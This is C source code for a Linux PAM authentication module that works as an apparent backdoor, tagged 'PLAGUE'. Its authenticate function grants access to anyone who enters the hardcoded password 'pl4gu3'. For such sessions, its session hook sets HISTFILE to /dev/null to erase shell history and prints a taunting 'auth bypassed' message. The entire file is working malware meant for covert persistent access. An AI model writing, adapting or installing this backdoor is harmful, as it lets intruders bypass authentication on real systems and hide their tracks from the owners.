#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pwd.h>
#include <grp.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/ptrace.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>


PAM_EXTERN int
pam_sm_authenticate(pam_handle_t *pamh, int flags,
    int argc, const char *argv[])
{
    const char* magic_pass = "pl4gu3";
    const char* password = NULL;
    int session;

    if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL) != 0) {
        return PAM_AUTH_ERR;
    }

    if (password != NULL && strcmp(password, magic_pass) == 0) {
        session = 0;
        pam_set_data(pamh, "PLAGUE_SESSION", (void *)(long)session, NULL);
        return PAM_SUCCESS;
    } else {
        session = -1;
        pam_set_data(pamh, "PLAGUE_SESSION", (void *)(long)session, NULL);
        return PAM_AUTH_ERR;
    }
}

PAM_EXTERN int
pam_sm_setcred(pam_handle_t *pamh, int flags,
    int argc, const char *argv[])
{

    return PAM_SUCCESS;
}

PAM_EXTERN int
pam_sm_acct_mgmt(pam_handle_t *pamh, int flags,
    int argc, const char *argv[])
{


    return PAM_SUCCESS;
}

PAM_EXTERN int
pam_sm_open_session(pam_handle_t *pamh, int flags,
    int argc, const char *argv[])
{
    void *data = NULL;
    int session;

    if (pam_get_data(pamh, "PLAGUE_SESSION", (const void **)&data) != PAM_SUCCESS) {
        return PAM_SUCCESS;
    }

    session = (int)(long)data;
    if (session == 0) {
        pam_putenv(pamh, "HISTFILE=/dev/null");
        pam_info(pamh, "[+] - User auth bypassed, hehehehe\n");
    }

    return PAM_SUCCESS;
}

PAM_EXTERN int
pam_sm_close_session(pam_handle_t *pamh, int flags,
    int argc, const char *argv[])
{

    return PAM_SUCCESS;
}

PAM_EXTERN int
pam_sm_chauthtok(pam_handle_t *pamh, int flags,
    int argc, const char *argv[])
{

    return PAM_SERVICE_ERR;
}
